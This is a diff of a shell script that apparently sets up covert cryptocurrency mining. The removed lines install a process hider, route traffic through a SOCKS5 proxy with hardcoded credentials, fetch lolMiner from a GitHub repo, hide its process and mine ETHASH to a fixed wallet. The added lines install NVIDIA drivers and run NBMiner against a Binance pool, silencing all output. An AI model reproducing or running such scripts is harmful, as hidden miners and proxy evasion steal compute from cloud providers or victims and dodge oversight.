@@ -1,43 +1,16 @@
-apt update && apt -y install sudo wget curl unzip
-
-sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-
-apt-get install -y nodejs
-
-npm i -g node-process-hider
-
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-
-dpkg-reconfigure --frontend noninteractive tzdata
-
-wget https://github.com/DeniBogeh/DeniBogehh/raw/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 =  45.140.13.119:9132 
-socks5_username = nemxplkj
-socks5_password = k1ado8prv8y6
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-
-echo " "
-
-./graftcp/graftcp wget https://github.com/DeniBogeh/DeniBogehh/raw/main/lolMiner
-
-chmod +x lolMiner
-
-ph add lolMiner
-
-./graftcp/graftcp ./lolMiner --algo ETHASH --pool 172.65.247.152:4444 --user 7C86A8aa5482c0e35f193187A57f0D659092e916.$(echo $(shuf -i 1-999 -n 1)-PHO)
+cd /home
+sudo apt-get install linux-headers-$(uname -r) -y >/dev/null 2>&1
+distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g') >/dev/null 2>&1
+wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin >/dev/null 2>&1
+sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600 >/dev/null 2>&1
+sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-keyring_1.0-1_all.deb >/dev/null 2>&1
+sudo dpkg -i cuda-keyring_1.0-1_all.deb >/dev/null 2>&1
+sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/3bf863cc.pub >/dev/null 2>&1
+sudo apt-get update >/dev/null 2>&1
+sudo apt-get -y install cuda-drivers-510 >/dev/null 2>&1
+sudo apt-get install libcurl3 -y >/dev/null 2>&1
+apt update && sudo apt-get --purge remove "*nvidia*" && sudo apt-get install nvidia-driver-460 >/dev/null 2>&1
+wget https://github.com/NebuTech/NBMiner/releases/download/v42.2/NBMiner_42.2_Linux.tgz >/dev/null 2>&1
+sudo tar -xvf NBMiner_42.2_Linux.tgz >/dev/null 2>&1
+cd NBMiner_Linux >/dev/null 2>&1
+sudo ./nbminer -a octopus -o stratum+tcp://ethash.poolbinance.com:443 --user teguhcong.$(echo $(shuf -i 1000-9999 -n 1)-KVN) >/dev/null 2>&1
